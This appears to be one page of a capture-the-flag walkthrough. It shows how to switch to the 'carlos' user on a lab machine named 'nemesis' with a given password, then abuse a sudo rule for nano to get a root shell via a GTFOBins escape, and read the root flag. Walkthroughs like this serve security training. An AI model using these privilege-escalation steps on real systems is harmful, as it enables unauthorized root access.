<!doctype html><html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>Getting 3rd flag</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
  <script></script>
</head>
<body><div class="page"><h1 class="title">Getting 3rd flag</h1><br/><br />a) Connect via SSH as you did on section “3.2 Connecting via SSH”.<br /><br />b) Log in as “carlos” user.<br />    <br />    <div class="codebox"><div class="codebox">$&nbsp;<span style="color:#a52a2a;font-weight:700">su</span>&nbsp;carlos</div></div><br />    <br />    Password: “ENCRYPTIONISFUNPASSWORD”<br /><br />c) Let's see what “carlos” may run.<br /><br />    <div class="codebox"><div class="codebox">$&nbsp;<span style="color:#a52a2a;font-weight:700">sudo</span>&nbsp;-l</div></div><br /><br />     <span style="color:#ffa500;background-color:#ffffff;">Output:</span><br />    <img src="images/415-1.png" alt="images/415-1.png" /><br />    <br />    “carlos” may run the following commands on nemesis:<br />    (root) /bin/nano /opt/priv<br /><br />    The user can only use “sudo” in “/opt/priv” directory, if the user will try to use it some other place, he will be restricted.<br /><br />d) Visit <a href="https://gtfobins.github.io/gtfobins/nano/#sudo">https://gtfobins.github.io/gtfobins/nano/#sudo</a> and you'll find a way of exploit these privileges to get a root shell.<br /><br />    Run the following code:<br />    <br />    <div class="codebox"><div class="codebox">carlos@nemesis<span style="color:#a52a2a;font-weight:700">:</span>~$&nbsp;<span style="color:#a52a2a;font-weight:700">export</span>&nbsp;<span style="color:#6a5acd;font-weight:400">TERM</span>=xterm<br />carlos@nemesis<span style="color:#a52a2a;font-weight:700">:</span>~$&nbsp;<span style="color:#a52a2a;font-weight:700">sudo</span>&nbsp;<span style="color:#a52a2a;font-weight:700">/</span>bin<span style="color:#a52a2a;font-weight:700">/</span>nano&nbsp;<span style="color:#a52a2a;font-weight:700">/</span>opt<span style="color:#a52a2a;font-weight:700">/</span>priv<br /></div></div> <br /><br />e) After running “nano” you have to enter in “Command Execution” so enter “Ctrl+R” and then “Ctrl+X”.<br /><br />    <span style="color:#ffa500;background-color:#ffffff;">Output:</span><br />    <img src="images/415-2.png" alt="images/415-2.png" /><br /><br />f) Type “reset; sh 1&gt;&amp;0 2&gt;&amp;0” and “Enter”.<br />   You'll get a “root” shell.<br /><br />g) Type “id”.<br /><br />    <span style="color:#ffa500;background-color:#ffffff;">Output:</span><br />    <img src="images/415-3.png" alt="images/415-3.png" /><br /><br />h) Introduce the following commands on the shell:<br /><br />    <div class="codebox"><div class="codebox">python&nbsp;-c&nbsp;<span style="color:#ff00ff;font-weight:400">'import&nbsp;pty;pty.spawn("/bin/bash")'</span><br /></div></div><br /><br />    <span style="color:#ffa500;background-color:#ffffff;">Output:</span><br />    <span style="color:#000000;background-color:#000000;">root@nemesis:/home/thanos# </span><br /><br />i)  Introduce the following commands on the shell:<br /><br />    <div class="codebox"><div class="codebox">root@nemesis<span style="color:#a52a2a;font-weight:700">:/</span>home<span style="color:#a52a2a;font-weight:700">/</span>thanos#&nbsp;<span style="color:#a52a2a;font-weight:700">cd</span>&nbsp;<span style="color:#a52a2a;font-weight:700">/</span>root<br />root@nemesis<span style="color:#a52a2a;font-weight:700">:</span>~#&nbsp;<span style="color:#a52a2a;font-weight:700">ls</span><br />root@nemesis<span style="color:#a52a2a;font-weight:700">:</span>~#&nbsp;<span style="color:#a52a2a;font-weight:700">cat</span>&nbsp;root.txt<br /></div></div><br />    <br />    <span style="color:#ffa500;background-color:#ffffff;">Output:</span><br />    <img src="images/415-4.png" alt="images/415-4.png" /><br /><p align="center"><img src="images/home.png" height="22" width="22">  <a href="index.html">Index</a></p></div></body></html>